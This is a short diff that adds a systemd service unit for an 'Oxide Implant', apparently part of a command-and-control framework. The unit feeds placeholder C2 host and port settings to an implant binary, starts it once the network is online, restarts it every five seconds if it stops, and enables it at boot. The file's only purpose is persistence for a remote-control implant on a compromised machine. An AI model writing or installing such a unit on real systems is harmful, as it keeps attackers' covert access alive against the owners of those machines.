@@ -1,0 +1,15 @@
+[Unit]
+Description=Oxide Implant
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+Environment="OXIDE_C2_HOST={{C2_HOST}}"
+Environment="OXIDE_C2_PORT={{C2_PORT}}"
+ExecStart=/opt/oxide/oxide-implant
+Restart=always
+RestartSec=5
+
+[Install]
+WantedBy=multi-user.target
